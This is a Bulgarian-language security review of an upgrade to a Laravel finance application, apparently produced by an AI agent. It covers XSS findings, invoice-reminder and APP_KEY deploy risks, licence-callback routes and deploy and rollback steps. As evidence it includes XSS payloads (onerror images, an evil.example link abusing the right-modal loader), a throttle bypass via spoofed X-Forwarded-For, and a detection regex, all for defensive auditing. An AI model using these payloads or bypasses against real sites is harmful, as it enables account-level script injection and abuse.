# R2: сигурност и готовност за деплой (Anagami Finance View 6.0.10 → 6.0.19)

Независим преглед на клона `upstream/worksuite-v6.0.19` (`a6304a7`) спрямо `main` (`git diff main HEAD`: 446 файла, 139 нови, 307 променени, 0 изтрити). Работено е само с четене. Единственият променен файл е този отчет. Помощните скриптове са в `$S/r2/`, където `$S` = `/private/tmp/claude-501/-Users-tsvet-Documents-Projects-databackd-com/db6ca00b-fbd7-487e-96e1-2ae875b1a9df/scratchpad`. Всички проби вървят в транзакция с rollback върху `databackd_upgrade_local`, с `CACHE_DRIVER=array`.

## Резюме

| Тежест | Брой | Накратко |
|---|---|---|
| Блокер | 0 | В кода няма безусловен блокер. Две условни спирачки за деплоя са описани като „висок“ (В1, В2): ако проверката на production не мине, деплоят спира. |
| Висок | 2 | В1: напомнянията за фактури могат да изпратят масово писма до реалните клиенти на компания 4. В2: при примерен или празен `APP_KEY` всяка уеб заявка става 500. |
| Среден | 5 | С1: stored XSS през описанието на продукт в новия изглед. С2: HTMLPurifier пропуска `class="openRightModal"` (XSS с един клик, възможен и от анонимната форма). С3: публичната форма пише в скрития CRM на всяка компания, а throttle-ът се заобикаля с `X-Forwarded-For`. С4: качването на `vendor/` (dev инсталация, оптимизиран classmap). С5: след деплоя изчезват картинките `data:` и таблиците в старото съдържание. |
| Нисък | 4 | Н1: външни картинки като „пиксел“. Н2: права и модул при имейлите от сделки. Н3: остатъчни рискове в Worldpay (кодът е неактивен). Н4: кешът на HTMLPurifier трябва да може да се записва. |
| Пре-съществуващи | 12 | Най-важни са П1 (purchase code в HTML-а на всяка страница за всеки потребител) и П2 (маршрутите на Froiden за гост, които пишат в базата и пращат данни към Froiden). Описани са в §4. |

Какво е проверено: `php -l` на 262 променени PHP файла (0 грешки). `php artisan route:list` (2420 маршрута, без дублирани имена; само 1 стар маршрут е closure). `databackd:check-security`: **83/83** (`$S/r2/check-security.txt`). Пуснати са 2 собствени проби: `probe-product-xss.php` и `probe-throttle-xff.php`. HTMLPurifier е проверен с проби на `clean_editor()`. Рендирането е проверено със `smoke.php` като админ и като клиент.

---

## 1. Находки в diff-а

### В1 (висок, условен блокер): напомнянията за фактури тръгват на всеки час и първото пускане праща писмо за всяка просрочена фактура

- **Къде:** `app/Console/Kernel.php:147` (`send-invoice-reminder` е `->hourly()`, преди беше `dailyAt('01:50')`). Също `database/migrations/2026_07_14_000001_add_advanced_reminder_settings.php:109-114` (`reminder_after_enabled = send_reminder_after > 0`, `until_paid`) и `app/Services/InvoiceReminderService.php:249-251` (без `reminder_last_sent_at` → `true`).
- **Сценарий:** нека компания 4 (реални потребители и клиенти) има `send_reminder_after > 0` в старите настройки. Миграцията включва „след падежа, на всеки N дни, докато не се плати“. Колоната `invoices.reminder_last_sent_at` е нова и е `NULL` за всички фактури. Затова при първото пускане на `:00` след `up` командата праща `InvoiceReminderAfter` за **всяка** неплатена просрочена фактура, включително стари от месеци или години. Писмото се праща винаги, когато клиентът има имейл: в известието няма проверка на `email_notification_settings`. Писмата съдържат и подписан линк към фактурата (`include_payment_link = true` по подразбиране). Изпратено писмо не може да се върне.
- **Доказателство:** по кода (`SendInvoiceReminder::handle` → `shouldSendAfterReminder`). A02 описва същото. На production не е проверено.
- **Какво да се направи (преди `php artisan up`):**
  ```sql
  SELECT company_id, send_reminder, reminder, send_reminder_after FROM invoice_settings WHERE send_reminder > 0 OR send_reminder_after > 0;
  ```
  Ако върне ред, решението е на собственика. Веднага след `migrate` и преди `up` има два варианта:
  - да се изключи временно: `UPDATE invoice_settings SET reminder_after_enabled = 0 WHERE company_id IN (…)`;
  - или броенето да започне от днес: `UPDATE invoices SET reminder_last_sent_at = NOW() WHERE company_id IN (…) AND status NOT IN ('paid','canceled','draft') AND due_date < CURDATE();`.

  Същото важи и за демо компанията 17: клиентите ѝ са с реалистични домейни (`@balkan.bg`).

### В2 (висок, условен блокер): `refuseInsecureAppKey()` дава 500 на целия сайт, ако ключът е примерният или е празен

- **Къде:** `app/Providers/AppServiceProvider.php:50` и `:120-131` (upstream).
- **Сценарий:** `APP_KEY` на production не е ротиран (отворено от S6/S10). Ако е примерният `base64:wID/…`, след `config:cache` **всяка** уеб заявка връща 500. Конзолата продължава да работи, затова `artisan` не показва проблема.
- **Проверката на A11** (`grep '^APP_KEY=' .env | shasum -a 256 | cut -c1-10` ≠ `fa9430d687`) е вярна само ако редът е буквално `APP_KEY=base64:…`. Проверих, че хешът на точно този ред е `fa9430d687`. Кавички, интервал в края или CRLF дават друг хеш, а `config('app.key')` пак е примерният. Ключът, който реално действа, е кешираният в `bootstrap/cache/config.php`.
- **По-сигурна проверка** (печата само статус, не ключа):
  ```bash
  cd ~/public_html && php -r 'require "vendor/autoload.php"; $a=require "bootstrap/app.php"; $a->make(Illuminate\Contracts\Console\Kernel::class)->bootstrap(); $k=(string)config("app.key"); echo $k===""?"EMPTY":($k==="base64:wID/CO/WkfE3yoWpQOoy15de8FtOpvC3dM/z5FuHiEU="?"SAMPLE":"OK"), PHP_EOL;'
  ```
  Ако резултатът е `SAMPLE` или `EMPTY`, деплоят спира. Ротацията на ключа става отделно, преди него (вж. S6 §6 т. 2 и С4/П-бележката за `Common::encryptDecrypt`).

### С1 (среден): stored XSS през описанието на продукт в новия изглед на продукта

- **Къде:** `resources/views/products/ajax/show.blade.php:408`: `{!! $product->description !!}`. Това е нов upstream дизайн, слят от A06.
- **Сценарий:** описанието на продукт идва и от импорта от Excel (`app/Jobs/ImportProductJob.php:68`). Импортът не минава през `XssLinearMerge` и не ползва `trim_editor`. Има и стари редове, записани преди 6.0.19, когато `trim_editor()` още не чистеше нищо, а `description` е в `config/xss_ignore.php`. Служител с право за продукти или за импорт слага `<img src=x onerror=…>` в описанието. Кодът се изпълнява у всеки, който отвори продукта: админ, служител, клиент с `view_product`. Продуктът се отваря и в десния модал (`openRightModal` → `.html()`). Целият останал 6.0.19 код показва такива стойности през `clean_editor()` (`x-cards.data-row html`). Само този нов ред не го прави. В `main` описанието беше сурово (`data-row` без чистене), т.е. проблемът не е нов. Новият компонент обаче го беше затворил, а този изглед го отваря отново.
- **Доказателство:** `$S/r2/probe-product-xss.php`. В транзакция описанието на първия продукт на „Демо Финанс Груп“ става `<img src=x onerror="window.__r2=1">`, после страницата `/account/products/{id}` се рендира. Като `admin@demofinans.bg`: HTTP 200, **суровият payload е в HTML-а**. Като клиент `p.yordanov@balkan.bg`: 403 (няма право в демо данните).
- **Поправка:** `{!! clean_editor($product->description) !!}` с маркер `databackd (upgrade 6.0.19)`. По желание още: `trim_editor()` на описанието в `ImportProductJob`.

### С2 (среден): `EditorSanitizer` пропуска атрибута `class`, а `class="openRightModal"` прави линк, който зарежда и изпълнява чужд HTML

- **Къде:** `app/Helper/EditorSanitizer.php:30,42,50,52` (`p|a|span|img` с `class`; няма `Attr.AllowedClasses`/`ForbiddenClasses`) и `resources/js/custom.js:143-160`. Глобалният handler `$("body").on("click", ".openRightModal", …)` прави `$.easyAjax({url: this.href})` и после `$(RIGHT_MODAL_CONTENT).html(response.html)`.
- **Сценарий:** нападателят пише в поле с редактор `<a href="https://evil.example/x" class="openRightModal">виж офертата</a>`. Схемата `https` е позволена. Подходящи са описание на задача, коментар, обява, бележка, а също **анонимно** полето `message` на публичната форма за потенциални клиенти. Там `HomeController.php:866,878` вече вика `clean_editor()`, а `leads/ajax/notes.blade.php:34` показва резултата. Жертвата (админ) кликва. Тогава jQuery прави прост cross-origin GET: `application/x-www-form-urlencoded`, без preflight. Сървърът на нападателя отговаря с `Access-Control-Allow-Origin: https://databackd.com` и `{"status":"success","html":"<img src=x onerror=…>"}`. Кодът се изпълнява в нашия origin, защото CSP е само Report-Only. В `main` тези полета бяха изобщо без чистене, т.е. 6.0.19 е подобрение, но остава тази „джаджа“ с един клик.
- **Доказателство:** `clean_editor('<a href="https://evil.example/x.json" class="openRightModal">…</a>')` връща линка с `class="openRightModal"` (и `target="_blank" rel="noreferrer noopener"`, но handler-ът прави `preventDefault()`). Същото важи за `<span class="openRightModal">` и `<img class="openRightModal">`. Сървърът на нападателя не е пробван (без външни заявки).
- **Поправка** (A11 / `EditorSanitizer`): `$config->set('Attr.ForbiddenClasses', ['openRightModal', 'inModal']);` или whitelist `Attr.AllowedClasses` (`ql-*`, `mention`, `fa*`, `text-*`, `f-*`…), после `HTML.DefinitionRev` → 2. На `a` атрибутът `class` не е нужен (Quill не го слага), затова може и `a[href|target|rel|style]`. Като втора защита: в `custom.js` `openRightModal` да приема само същия origin (`new URL(this.href).origin === location.origin`).

### С3 (среден): публичната форма пише в скрития CRM на всяка компания, а новият throttle се заобикаля с `X-Forwarded-For`

- **Къде:** `routes/web-public.php:46,48` (`throttle:10,1`); `app/Http/Requests/Lead/StorePublicLead.php:39` (`Company::findOrFail(company_id)`, поредно число); `HomeController::leadStore` (`:760`); `app/Http/Middleware/TrustProxies.php:15` (`$proxies = '*'`).
- **Сценарий:**
  1. Миграцията `2026_08_03_140000` създава активна форма „Default“ за всяка компания с полета. За POST хешът не е нужен: стигат поредните `company_id` и `lead_form_id`. CRM е скрит (S1) и никой не гледа формата, но тя приема анонимни контакти, сделки и бележки в компания 4. XSS вече е спрян (`clean_editor`), но остават спам, „пиксели“ (Н1) и джаджата от С2.
  2. Throttle-ът брои по IP. При `TrustProxies = '*'` IP-то се взема от подаденото от клиента `X-Forwarded-For`.
- **Доказателство:** `$S/r2/probe-throttle-xff.php` (12 POST-а с `company_id=0` → 404 преди запис, в транзакция):
  - без XFF: `404 ×10, 429, 429`;
  - с нов XFF всеки път: `404 ×12`, без нито един 429.

  Дали LiteSpeed пропуска XFF от клиента, не е проверено (S10 A8 е отворено).
- **Поправка:**
  - (а) докато CRM е скрит: `abort_if(databackd_hidden('menu', 'leads'), 404);` в началото на `HomeController::leadForm()` и `leadStore()`. Това е предложение на A04/A07, което не е приложено. Супер админът не е засегнат, а гостът винаги получава 404.
  - (б) `TrustProxies::$proxies`: адресът на реалния прокси или `null`, след проверка на LiteSpeed (отворена точка от S10).

### С4 (среден, деплой): `vendor/` в worktree-а е dev инсталация с оптимизиран classmap

- **Факти:**
  - `vendor/composer/installed.json` е с `"dev": true`. Вътре са `barryvdh/laravel-debugbar`, `spatie/laravel-ignition`, `laravel/sail`, `fakerphp/faker`, `nunomaduro/collision` и др. `PackageManifest` ги регистрира на всяка заявка. `route:list` локално показва `_debugbar/*` и `_ignition/*`.
  - `composer.json` има `optimize-autoloader: true`. `vendor/composer/autoload_classmap.php` (18:35) съдържа 1939 класа от `app/`. Проверих го срещу сегашния worktree: 0 липсващи файла, 3 файла с функции (`autoload_files`). `classmap-authoritative` не е включено, т.е. нов клас се намира през PSR-4.
  - `khaled.alshamaa/ar-php` го няма (има предпазител).
- **Рискове:**
  - (а) Ако на production няма dev пакетите (00-plan твърди, че vendor-ът е същият), качването на целия `vendor/` ги добавя.
  - (б) При `APP_ENV=codecanyon` `app/Http/Controllers/Controller.php:84-86` задава по време на заявката `config(['app.debug' => global_settings.app_debug])`. Ако флагът в базата е 1, грешките се показват с подробности на всеки.
  - (в) Ако след последния `dump-autoload` клас бъде **изтрит** или преименуван, classmap-ът сочи несъществуващ файл. Тогава `class_exists()` или autoload дават warning, т.е. 500.
- **Какво да се направи:**
  - преди качване: `rsync -rlcn --itemize-changes vendor/ databackd:public_html/vendor/`, за да се види реалната разлика (очаквани са само `vendor/composer/autoload_*.php`). Да се качат само те, **без** `--delete`;
  - `SELECT app_debug FROM global_settings` = 0 и `APP_DEBUG=false` в `.env`;
  - `composer dump-autoload` наново, ако след 18:35 се добавят или махат класове (напр. поправките от R1/R2);
  - по желание: `pcinaglia/laraupdater` в `extra.laravel.dont-discover` (П6). Тогава `composer.json` се качва и се пуска `optimize:clear`.

### С5 (среден, данни и функционалност): HTMLPurifier при показване и при запис маха картинките `data:` и таблиците от старото съдържание

- **Къде:** `app/Helper/EditorSanitizer.php` (`URI.AllowedSchemes` без `data`; няма `table`). `clean_editor()` се вика в `x-cards.data-row html` и в 10 изгледа, а `trim_editor()` при запис (116 места).
- **Сценарий:** в старите описания на задачи, проекти и т.н. на компания 4 има вмъкнати картинки като base64. Upstream дори има команда `tasks:convert-base64-images` (`app/Console/Commands/ConvertTaskBase64Images.php`). След деплоя тези картинки и таблиците **не се показват**. При следващата редакция и запис **изчезват и от базата**, без предупреждение.
- **Доказателство:** `clean_editor('<p>a</p><p><img src="data:image/png;base64,…"></p><table><tr><td>x</td></tr></table>')` → `<p>a</p><p></p>x`.
- **Какво да се направи:**
  - на production (само четене): `SELECT COUNT(*) FROM tasks WHERE description LIKE '%data:image%';` (и за `task_comments`, `projects.project_summary`, `notices`, `products`);
  - при резултат > 0: `php artisan tasks:convert-base64-images --dry-run` след деплоя, после без `--dry-run`. Това е запис в данни, т.е. само с решение на собственика и след backup.

### Н1 (нисък): външни картинки и `background:url()` в почистения HTML

`EditorSanitizer` позволява `img[src]` с http/https и `style` с `background`. Анонимното `message` на формата (С3) може да носи `<img src="https://tracker/…">`. Така служителят, който отвори бележката, издава IP-то си (A04 го е отбелязал). Поправка: за входа от публичната форма `HTML.Allowed` без `img` и без `style`, или `strip_tags` с `nl2br`.

### Н2 (нисък): имейли от сделки, проверки на права и модул

- `DealEmailController` и `DealEmailTemplateController` не проверяват модула `leads` (другите CRM контролери го правят). `manage_deal_email_template` с „added“ дава права върху всички шаблони. `fetchTemplate` иска право за управление на шаблоните (A07 т. 2–3, A11 т. 6).
- Получателят вече е ограничен до контакта, а копието до потребители на компанията (`SendEmailRequest`). Проверих, че `User::whereIn('email', …)` е под `CompanyScope`.
- Поправка: `abort_403(!in_array('leads', user_modules()))` в конструкторите.

### Н3 (нисък): Worldpay (кодът е неактивен на production)

- Всички публични пътища проверяват `worldpay_status === 'active'`. Webhook-ът е с HMAC и `hash_equals`, а при празен secret дава 400. Хостовете за action URL са в whitelist. `session_href` не се fetch-ва (отива в JSON тялото). `three-ds-return` рендира само `@json($reference)`.
- Остават две неща:
  - заключването от 15 мин остава при резултат „action/pending“: започнат и изоставен 3DS блокира плащането по поредния id;
  - `worldpay-public/{id}` работи по пореден id и без throttle.
- Значение има само ако Worldpay се включи. Тогава: throttle и подписан/хеширан id.

### Н4 (нисък, деплой): кешът на HTMLPurifier

`storage/app/htmlpurifier/` трябва да може да се записва от PHP потребителя на уеб сървъра. Ако не може, `E_USER_WARNING` става изключение и **всяко показване или запис на HTML от редактор** дава 500. Да се направи `mkdir -p storage/app/htmlpurifier` като собственика на сайта, преди `up`.

---

## 2. Поправките от вълна 1: затварят ли проблема и отварят ли нов

| Поправка (отчет) | Оценка | Бележка |
|---|---|---|
| `AuthHardening::guardEmailTwoFactor`: `user_id` е по избор (11) | ✅ затваря, не отслабва | `LoginController::twoFactorLoginUser()` взема идентичността само от `login.id` и проверява с `hash_equals` и изтичане. Подаденото `user_id` трябва да съвпада. Лимитът 5/600 s остава единствената защита срещу изброяване, защото upstream вече не нулира кода. Дотук е наред. |
| `throttle:10,1` на `leadStore`/`ticket-store` (11) | ⚠️ частично | Заобикаля се с `X-Forwarded-For` (С3, доказано). |
| `down/*`, `up/*` → 404 (`config/security-headers.php:129-136`) (11) | ✅ | Действа чак след `config:cache`. В `route:list` няма легитимни `up/`/`down/` маршрути (проверено). |
| `clean_editor` в `leadStore` + изгледите `leads/ajax/notes`, `leads/notes/edit`, `lead-contact/notes/edit` (04/07) | ⚠️ частично | Директният XSS е затворен. Остават джаджата `class="openRightModal"` (С2) и „пикселът“ (Н1). Други сурови изходи на `LeadNote.details`/`Deal.note` не намерих (DataTables са без `details` в `rawColumns`). |
| `leadStore` не презаписва съществуващ контакт (04) | ✅ | Попълват се само празните полета. За custom fields: филтър по `field_<id>`. Чуждите `source`/`category_id`/`product.*` дават 422 (`StorePublicLead`). |
| `SendEmailRequest`: получател и копие (07) | ✅ | Без open relay. Имейлът е под CompanyScope. |
| `parseMergeFields(..., escapeHtml)` + `clean_editor` в шаблоните (07) | ✅ | Темата се показва с `.val()`. `history->subject` като заглавие на модала (`.html(response.title)`) идва само от заявката, т.е. минава `strip_tags`. |
| `FileController`: whitelist на папките с маскирани изображения (09) | ✅ | Изключението от `abort_if` се хваща → 404. Старият ключ работи само за публичните папки. |
| `ImageController::store` `mimes:` (09), `MessageFileController` IDOR (09) | ✅ | |
| `Product::$hidden` (`cost_price`, платеният файл) (06) | ✅ | Не обхваща описанието (С1). |
| Ресурси на продукта: валидация, `link_url`, `company_id` (06) | ✅ | Качването минава през `Files::validateUploadedFile` (вътре в `uploadLocalOrS3`). |
| Количката: `removeCartItem` (06) | ✅ | |
| Отпуски/присъствие: права и експорти (08) | ✅ (по кода) | Не са одитирани останалите методи на `AttendanceController` (A08 т. 7). |
| Worldpay: освобождаване на заключването, `payerMessage` (05) | ✅ | Остатъкът е в Н3. |
| `worldpayModal` → 404 без активен Worldpay (04) | ✅ | |
| `getBankStatement`: права (04) | ✅ | `generateStatement` вече имаше проверка. |
| `estimateAccept/Decline` само при `waiting` (04) | ✅ | |
| `notification_fallback` с `e()` (10) | ✅ | |
| `EditorSanitizer`: `i[class]`, data-* на споменаванията, `pre` (11) | ✅ / ⚠️ | `data-id` е Number, `data-link` е URI (http/https/mailto/tel), `on*` се маха. Новото тук е само `i[class]`. `class` на `a/p/span/img` идва от upstream (С2). |
| `pdfFixArabic` guard (11) | ✅ | Без fatal. Арабският се печата неоформен. |

S6 не е отслабено:
- `Kernel` е непроменен: `XssLinearMerge`, `VerifyCsrfTokenPathOnly`, `RestrictVendorMaintenanceRoutes`, `SecurityHeaders`, `FinApiGate`;
- `UserAuth` е с bindings;
- няма `enable_php` (`check-security` P10-01);
- в git и в worktree-а няма `public/backup-and-restore`, `public/check.php`, `.env.dev`, `froiden-verify/`;
- `log-viewer` е зад `super-admin` + Gate;
- `sync-user-permissions` е зад `auth` + `super_admin_only`;
- `cropper` е зад `auth`;
- `check-security` е 83/83.

---

## 3. Лицензът: други пътища към `/verify-purchase`, блокиране или данни към Froiden

**Превключвателят покрива двете места с `isLegal()`:** `FortifyServiceProvider.php:190` (loginView) и `SuperAdmin/FrontendController.php:413`. Друго пренасочване към `/verify-purchase` в `app/`, `routes/`, `resources/` (и JS) няма. `vendor/froiden/envato` (5.3.0) е същият като в 6.0.10. Няма middleware на Froiden, който да блокира без ключ: `FroidenEnvatoServiceProvider` само регистрира маршрути и команда. Дистанционното `down/{hash}` (`artisan down --secret=froiden` при липсващ purchase code) и `up/{hash}` са затворени от нашия `hidden` списък. Без ключ сайтът **не се блокира**.

**Данни към Froiden обаче все още се пращат. Пътищата не зависят от `databackd_license_check()` и са пре-съществуващи:**

| Път | Кой | Какво праща и какво пише |
|---|---|---|
| `POST /purchase-verified` (`vendor/froiden/envato/src/routes.php:11`, `AppBoot::purchaseVerified:126`, `getServerData:214`) | **гост**, само с CSRF токен от `/login` | Без `purchase_code`: **съхраненият** purchase code + домейн + версия + URL към `verify_url` на Froiden. Отговорът на Froiden (лицензни данни) се връща на госта. Пише `supported_until`/`purchased_on`/`license_type`. С `purchase_code`: при успех **или** при недостъпен Froiden (`json_decode(false)` = null) `saveToSettings()` **презаписва** purchase code-а в `global_settings` с подадения. |
| `GET /hide-review-modal/{type}` (`routes.php:12`, `AppBoot::hideReviewModal:268`) | **гост**, без CSRF | `show_review_modal = 0` в `global_settings` + GET към `…/button-pressed/<purchase_code>/<type>` (кодът е в URL-а). |
| `GET /verify-purchase` | гост | Само формата (200). Нищо не пренасочва към нея. |
| `DashboardController:61`, `SuperAdmin/DashboardController:32,39` → `isCheckScript()` | всеки вход в таблото | Праща нещо само ако `purchase_code IS NULL`: примерен код + имейла на компанията + домейна. На production кодът е записан, т.е. нищо не се праща. **Ако някой го изтрие, започва да се праща.** |
| `SuperAdmin/DashboardController:333`, `update-settings`, `custom-modules` → `EnvatoUpdate::plugins()/updateVersionInfo()` | супер админ | GET (версия в URL-а), кеш 30 мин, без блокиране. |
| `update-settings/partials/partner-products-promo.blade.php:10`, `raise-support-ticket-modal.blade.php:76` | при отваряне на страница | `<img src="https://envato.froid.works/logo-froiden.png">`: IP + Referer (origin). |
| `sections/raise-support-ticket-modal.blade.php:114` (включено в `sidebar.blade.php:166`) | **всеки влязъл потребител** | `purchase_code` е в href-а в HTML-а на всяка страница (П1). |

**Препоръка:**
- Докато проверката е изключена: в `config/security-headers.php` `restricted_routes.super_admin_only` да се добавят `verify-purchase`, `purchase-verified`, `hide-review-modal/*`. Тогава гост и обикновен потребител получават 404. Супер админът може да ползва страницата, когато лицензът се въведе.
- `raise-support-ticket-modal`: purchase code-ът да е само за супер админа или да се махне от URL-а (П1).
- На production да се провери, че `~/public_html/froiden-verify/` **не съществува**. `composer.json` мапва `Froiden\Envato\` първо към него, така че такава папка би подменила целия vendor пакет.
- Да не се ползва вграденият updater (`admin/update-version/*` е само за супер админ, но ще презапише къстомизациите).

---

## 4. Пре-съществуващи проблеми (и в `main`), които не са блокер за този деплой

| # | Тежест | Къде | Какво | Предложение |
|---|---|---|---|---|
| П1 | среден | `resources/views/sections/raise-support-ticket-modal.blade.php:114` | Purchase code-ът на Anagami Finance View е в HTML-а на всяка страница за **всеки** потребител на всяка компания, вкл. клиенти (проверено: линкът е в таблото на клиента; локално кодът е празен). Същото изтичане, заради което S6 затвори `/check-env`. | `@if (user()->is_superadmin)` около блока или без параметъра |
| П2 | среден | `vendor/froiden/envato/src/routes.php:10-12` | Маршрутите за лиценза за гост: запис в `global_settings` + заявки към Froiden (§3) | `super_admin_only` |
| П3 | среден | `app/Http/Middleware/TrustProxies.php:15` | `'*'`: IP лимитите (вход, публични форми) се заобикалят с XFF (С3, S10 A8) | реалният прокси или `null` |
| П4 | нисък | `config/dompdf.php:266` (`enable_remote => true`) + `pdfStripTags()` (`app/Helper/start.php:1255`, пази атрибутите на `<img>`) | `item_summary`/описания (в `xss_ignore`) с `<img src="http://вътрешен">` = blind SSRF при PDF. Новите `*/pdf/invoice-6` повтарят шаблона (A11 5.5). | `enable_remote=false` + локални пътища за логото и банерите |
| П5 | нисък | `app/Http/Controllers/Controller.php:84-86` | При `APP_ENV=codecanyon` `app.debug` идва от `global_settings.app_debug`. Във vendor има debugbar/ignition (С4). | проверка = 0 |
| П6 | нисък | `vendor/pcinaglia/laraupdater` (P10-09) | `GET /updater.check|currentVersion|update` без middleware | `dont-discover` в `composer.json` |
| П7 | нисък | `InvoiceController::sendInvoice:1109` | Няма проверка на правата (A02 т. 3). `invoices/product-category` дава каталога и цените на клиентите (A06 искане 3). Повтарящите се фактури и публичното приемане на оферта минават без `max_invoices` (A02, A04). | |
| П8 | нисък | `app/Notifications/ProposalSigned.php:~90` | `client_comment` от публичния отказ (полето `comment` е в `xss_ignore`) влиза като суров HTML в имейла до админите | `e()` |
| П9 | нисък | 17 изгледа с `data-content="{!! … !!}"` (напр. `tasks/ajax/show.blade.php:311`) | Атрибутът се чупи с `"` (A09 т. 3) | `e()` |
| П10 | нисък | `GET attendances/update-clock-in` (`routes/web.php:153`) | Променя състояние с GET, без CSRF (A08 т. 2). Присъствието е скрито. | POST |
| П11 | нисък | всички скрити модули | „Скрито ≠ защитено“ (S6 P2-07): маршрутите на CRM, присъствие и т.н. работят по URL; миграцията дава на админите права за имейлите от сделки | |
| П12 | — | production | Отворено от S6/S10: ротация на `APP_KEY` и паролата на базата. Внимание: след този деплой `Common::encryptDecrypt` (маскираните URL-и, `quill-image`) и `encrypted` полетата на Worldpay зависят от `APP_KEY`. 2FA е на 0 от 6 админа. Демо паролата. | |

---

## 5. Готовност за деплой

### 5.1 Задължителни проверки на production преди деплоя (само четене)

1. **`APP_KEY`:** командата от В2. При `SAMPLE`/`EMPTY` деплоят спира.
2. **Напомнянията (В1):** `SELECT company_id, send_reminder, reminder, send_reminder_after FROM invoice_settings WHERE send_reminder > 0 OR send_reminder_after > 0;`.
3. **SQL на A12 §1:** `VERSION()`, последната миграция `2026_10_28_100000_create_databackd_gaps_tables`, `permission_types` 4/5, `global_subscriptions … ends_at IS NULL AND gateway_name <> 'offline'` (очаквано 0), `subscriptions` = 0, `lead_custom_forms` по компании, `late-clock-in%` = 0.
4. **Хешове (A04):** `SELECT … WHERE hash IS NULL OR hash=''` за `contracts`, `estimates`, `proposals`, `projects`, `invoices` → 0 навсякъде.
5. **Stored XSS отпреди (A04):** `SELECT 'lead_notes', id FROM lead_notes WHERE details REGEXP 'onerror|<script|javascript:' UNION ALL SELECT 'deals', id FROM deals WHERE note REGEXP 'onerror|<script|javascript:';` и същото за `products.description` (С1).
6. **Картинки `data:` (С5):** броят по таблиците.
7. **Дебъг:** `SELECT app_debug FROM global_settings;` → 0. `APP_DEBUG` в `.env` → `false` (без печатане на `.env`).
8. **`ls -d ~/public_html/froiden-verify`** → да не съществува.
9. **Файлове само на сървъра, които rsync ще презапише.** Всички 294 променени файла (`$S/r2/modified-to-deploy.txt`), особено 28-те `resources/lang/{bg,eng}/*.php` (Language Pack/translation manager може да е писал в тях), `public/user-uploads/.htaccess` и `config/*.php`. Извличаш `git archive main -- $(cat modified-to-deploy.txt)` във временна папка и пускаш `rsync -rlcn --itemize-changes --files-from=modified-to-deploy.txt databackd:public_html/ <папката>/`. Всеки различен файл е ръчна правка на сървъра и се преглежда, преди да се презапише.
10. **`vendor/`:** `rsync -rlcn --itemize-changes` (С4). Да се качи само реалната разлика.

### 5.2 Какво се качва и какво не

- **Качва се:** 411 файла (`$S/r2/deploy-candidates.txt` = 294 променени + 117 нови). В тях са:
  - новите `resources/lang/{eng,bg}/ui-{billing,crm,invoices,products,sales,shell}.php` и `bg/superadmin.php`;
  - `public/user-uploads/.htaccess` (по-строгият upstream);
  - `public/version.txt`, `public/img/{invoice-template/6.png,worldpay.svg}`, `public/sample-import/expense-sample.xlsx`, `public/css/main.css`;
  - и `vendor/composer/autoload_{classmap,files,psr4,static}.php` (след проверката от 5.1 т. 10).
- **НЕ се качват** (35 файла, `$S/r2/exclude.txt`):
  - `docs/**` (14 + `APP-UPDATE…`), `CLAUDE.md`, `tests/**` (6 файла; `MonitorScreenshotDayBoundsTest` иска несъществуващ модул);
  - `.gitignore`, `.env.example`, `_ide_helper.php`, `.phpstorm.meta.php`, `package-lock.json`, `resources/scss/**`, `public/css/main.css.map`;
  - `public/monitor/installers/{.gitkeep,manifest.json}` (безвредни, но ненужни);
  - `composer.json`/`composer.lock` (безвредни; `composer.json` се качва само ако се добави `dont-discover`, П6).
- **Никога** не се rsync-ва папката на worktree-а наведнъж. Там има игнорирани `.env` (локалната база), `public/user-uploads/{cf-test.xlsx,tmp-dashboard.xlsx,user.json}`, `storage/app/snapshots/`, `resources/lang/en/` (стара upstream версия, A03 т. 5) и `bootstrap/cache/*`.
- **Не се трие нищо** на сървъра (в diff-а няма изтрити файлове). rsync е **без** `--delete`. Така се пазят `public/user-uploads/databackd/.htaccess`, коренният `.htaccess` (HTTP→HTTPS), `Modules/LanguagePack`, `storage/app/modules_statuses.json`, `.env` и `laraupdater.json`.

### 5.3 Ред (допълва A12 §3 и S10)

1. Backup:
   - пълен `mysqldump --single-transaction` + засегнатите таблици по A12 §2;
   - копие на всичките 294 файла, които ще се презапишат, + цялото `resources/lang` + `vendor/composer/` + `bootstrap/cache/`;
   - `rsync -n --itemize-changes` (списък на новите `>f+++`), за да могат да се изтрият при връщане;
   - `chmod 700`.
2. `php artisan down --retry=60`. Scheduler-ът и `queue:work` не вървят в maintenance mode.
3. `rsync -rlt --delay-updates --files-from=…`, после `vendor/composer/autoload_*`.
4. `php artisan migrate:status`: точно 18 чакащи с имената от A12. После `migrate --pretend --force > …` и `migrate --force`.
5. **Веднага, ако 5.1 т. 2 върне редове:** мерките от В1 (решение на собственика), **преди** `up`.
6. `mkdir -p storage/app/htmlpurifier` като собственика на сайта (Н4).
7. `optimize:clear` → `config:cache` → `route:cache` → `view:clear`. **Само след последния rsync** (урокът от S5/S10). `DATABACKD_LICENSE_CHECK` да **не** се задава.
8. In-process проверка с `prod-render.php` (компания 17, `APP_RUNNING_IN_CONSOLE=false`). Ако В2 е пропуснато, тук се вижда 500.
9. `php artisan up`. Сесиите **не се трият** (компания 4).

### 5.4 След `up`

`curl` трябва да даде:
- `/login` 200 (без пренасочване към `/verify-purchase`);
- `/down/x`, `/up/x`, `/check-env` → 404;
- `/log-viewer` → 302 за гост;
- `/verify-purchase` → 200, ако не е добавено в `super_admin_only` (иначе 404);
- `POST /lead-form/leadStore` без данни → 404/422, а не 500.

В браузъра: вход с код по имейл (ако някой го ползва), запис на бележка или задача с редактор (кешът на HTMLPurifier), PDF на фактура, `/account/settings/language-settings` (LanguagePack се намира през PSR-4, защото локалният classmap е без него).

В `storage/logs/laravel-*.log` да няма нови грешки. На следващия `:00` да се види броят изпратени `InvoiceReminder*`.

### 5.5 Връщане

- **Логическо** (тествано от A12): с **новия** код още на място `php artisan migrate:rollback --force` връща партидата от 18 миграции. После се връщат файловете, `vendor/composer` и `lang`, трият се новите файлове по списъка `>f+++` и се пускат кешовете. `cancel_orphaned_gateway_subscriptions` не може да се върне (при 0 реда в 5.1 т. 3 това е без значение).
- **Пълно:** от dump-а.
- **Непоправимо:** изпратените напомняния (В1). Затова мерките от В1 се вземат **преди** `up`.
- **Наполовина изпълнена миграция:** изключенията `allowed_work_from`, `late_clock_in` и `lead_forms` са описани в A12 §4.

---

## 6. Скриптове и резултати (`$S/r2/`)

- `probe-product-xss.php`: С1 (админ 200, суров payload; клиент 403).
- `probe-throttle-xff.php`: С3 (без XFF `…429 429`, с XFF само 404).
- `check-security.txt`: 83/83.
